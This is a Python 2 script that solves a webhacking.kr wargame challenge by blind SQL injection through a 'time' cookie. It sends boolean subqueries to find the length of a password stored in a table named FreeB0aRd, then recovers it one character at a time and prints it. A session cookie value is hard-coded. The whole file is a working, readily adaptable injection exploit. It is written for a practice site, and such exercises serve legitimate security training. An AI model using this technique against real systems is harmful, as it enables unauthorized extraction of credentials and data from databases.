#-*- coding: utf-8 -*-
import sys
import time
import urllib2

import CookieManager


challengeUrl = "http://webhacking.kr/challenge/web/web-02/"
sessionId = "705a2f6ffbf64394f97221d85d339835"
falseCondition = "<!--2070-01-01 09:00:00-->"
trueCondition = "<!--2070-01-01 09:00:01-->"

print "[*] Find password length from Freeboard"
passwordLength = 0
isFoundPassword = False

CookieManager.addCookie("PHPSESSID", sessionId)

for passwordLength in range(9, 10):
    timeCookie = "1 and (SELECT length(password) FROM FreeB0aRd)=%d" % passwordLength
    CookieManager.addCookie("time", timeCookie)
    
    httpRequest = urllib2.Request(challengeUrl)
    httpRequest.add_header("Cookie", CookieManager.getCookie())
    
    httpConnection = None
    try:
        httpConnection = urllib2.urlopen(httpRequest)
        httpResponse = httpConnection.read()
        print "[*] Blind SQL Injection...", passwordLength
        if httpResponse.find(trueCondition) > 0:
            print "[+] FIND IT! password length is [", passwordLength, "]"
            print "[*]", timeCookie 
            isFoundPassword = True
            break
    except:
        raise
    finally:
        if httpConnection != None:
            httpConnection.close()

if not isFoundPassword:
    sys.exit(-1)

passwordValue = ""
    
for caretIndex in range(1, passwordLength+1):
    print
    print "[*] Blind SQL Injection...", caretIndex, "", 
    for charIndex in range(ord('0'), ord('9')+1) + range(ord('a'), ord('z')+1) + range(ord('A'), ord('Z')+1):
        sys.stdout.write(".")
        timeCookie = "1 and (select ascii(substr(password, %d, 1)) FROM FreeB0aRd)=%d" % (caretIndex, charIndex)
        CookieManager.addCookie("time", timeCookie)
        
        httpRequest = urllib2.Request(challengeUrl)
        httpRequest.add_header("Cookie", CookieManager.getCookie())
        
        httpConnection = None
        try:
            httpConnection = urllib2.urlopen(httpRequest)
            httpResponse = httpConnection.read()
            if httpResponse.find(trueCondition) > 0:
                print 
                print "[+] FIND IT!", chr(charIndex)
                passwordValue += chr(charIndex)
                break
        except:
            raise
        finally:
            if httpConnection != None:
                httpConnection.close()

if passwordValue.__len__() != passwordLength:
    sys.exit(0)
                    
print "[+] Freeboard password is [", passwordValue, "]"

